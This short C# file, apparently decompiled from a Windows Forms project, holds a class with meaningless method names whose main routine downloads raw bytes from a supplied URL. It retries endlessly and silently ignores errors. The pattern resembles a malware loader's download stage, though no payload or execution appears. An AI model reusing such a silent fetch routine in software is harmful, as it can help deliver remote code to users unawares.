using System.Net;

namespace WindowsFormsApp48;

internal class Token
{
	private static Token PatchResolver;

	internal static byte[] SetGlobal(string def)
	{
		byte[] array = null;
		WebClient webClient;
		while (true)
		{
			webClient = new WebClient();
			try
			{
				array = (byte[])CancelResolver(webClient, def);
			}
			catch
			{
				continue;
			}
			break;
		}
		webClient.Dispose();
		return array;
	}

	internal static object CancelResolver(object object_0, object object_1)
	{
		return ((WebClient)object_0).DownloadData((string)object_1);
	}

	internal static bool PublishResolver()
	{
		return PatchResolver == null;
	}

	internal static Token QueryResolver()
	{
		return PatchResolver;
	}
}
